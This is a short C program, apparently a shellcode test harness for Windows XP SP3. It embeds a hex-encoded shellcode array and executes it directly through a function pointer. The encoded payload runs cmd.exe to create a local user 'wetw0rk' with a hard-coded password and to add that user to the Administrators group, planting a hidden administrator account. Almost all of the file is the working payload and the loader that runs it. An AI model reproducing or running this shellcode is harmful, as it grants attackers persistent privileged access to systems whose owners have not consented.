/*
Executable name : shellcodetest
Designed OS     : Windows XP SP3
Version         : 1.0
Origin          : http://www.vividmachines.com/shellcode/shellcode.html
Description     : Simply used to test shellcode

Build using these commands:
        i686-w64-mingw32-gcc shellcodetest.c -lws2_32 -o shellcodetest.exe

*/

char code[]= "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53\xbb\x4d"
	"\x11\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xa2\xca\x81\x7c\xff"
	"\xd3\xe8\xe0\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20"
	"\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x77\x65"
	"\x74\x77\x30\x72\x6b\x20\x50\x57\x24\x23\x64\x20\x2f\x41"
	"\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61"
	"\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73"
	"\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x77"
	"\x65\x74\x77\x30\x72\x6b\x4e";

int main(int argc, char **argv)
{
        int (*func)();
        func = (int (*)()) code;
        (int)(*func)();
}

